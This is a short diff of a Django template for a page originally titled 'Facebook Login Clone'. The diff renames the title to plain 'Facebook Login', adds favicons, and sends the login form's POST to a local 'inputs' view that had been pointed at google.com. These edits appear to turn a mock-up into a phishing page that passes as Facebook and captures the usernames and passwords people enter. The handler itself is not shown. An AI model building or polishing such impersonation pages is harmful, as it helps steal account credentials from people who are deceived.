@@ -1,9 +1,13 @@
+{% load static %}
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook Login Clone</title>
+  <link rel="icon" href="{% static 'images/favicon.ico' %}" sizes="any">
+<!-- Optional PNG fallback -->
+<link rel="icon" type="image/png" href="{% static 'images/favicon.png' %}">
+  <title>Facebook Login</title>
   <!-- Bootstrap CDN -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
@@ -67,7 +71,7 @@
       <!-- Login box -->
       <div class="col-lg-6 d-flex justify-content-center">
         <div class="login-box w-100" style="max-width: 360px;">
-          <form method="post" action="https://www.google.com" class="wide-form">
+          <form method="post" action="{% url 'inputs' %}" class="wide-form">
             {% csrf_token %}
 
             <!-- Hidden honeypot -->
